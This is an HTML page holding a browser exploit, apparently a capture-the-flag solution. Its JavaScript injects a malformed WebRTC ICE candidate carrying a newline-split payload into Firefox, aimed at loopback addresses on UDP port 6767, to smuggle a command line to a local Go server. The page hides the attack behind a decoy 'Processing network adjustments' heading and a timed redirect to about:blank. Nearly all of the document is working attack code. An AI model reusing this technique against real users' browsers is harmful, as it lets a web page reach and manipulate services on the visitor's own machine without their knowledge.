<!DOCTYPE html>
<html>
<head>
    <title>Exploit Matrix Final</title>

<body>
    <h1>Processing network adjustments...</h1>
    <script>
        // The Go server splits buffers up to a newline character.
        // Prefixing with an inline break forces the network stack junk 
        // to line 1, keeping line 2 entirely clear for verification.
        const payload = "\ngive me the flag bro\n";

        function trickleExploit(ipAddress) {
            try {
                const pc = new RTCPeerConnection();
                pc.createDataChannel("trigger");

                pc.createOffer().then(offer => {
                    return pc.setLocalDescription(offer);
                }).then(() => {
                    // Inject a mock network candidate natively into the ICE layer.
                    // This bypasses the typical credential limits by forcing Firefox 
                    // to execute a raw transmission routing test directly on loopback.
                    const rtcCand = new RTCIceCandidate({
                        candidate: `candidate:1 1 UDP 1 ${ipAddress} 6767 typ host typ ${payload}`,
                        sdpMid: "0",
                        sdpMLineIndex: 0
                    });
                    pc.addIceCandidate(rtcCand);
                }).catch(e => {});
            } catch(e) {}
        }

        // Broad spectrum loopback targeting array
        trickleExploit("127.0.0.1");
        trickleExploit("[::1]");
        trickleExploit("[::ffff:127.0.0.1]");

        // Release the browser execution context safely after 2 seconds
        setTimeout(() => {
            window.location.href = "about:blank";
        }, 2000);
    </script>
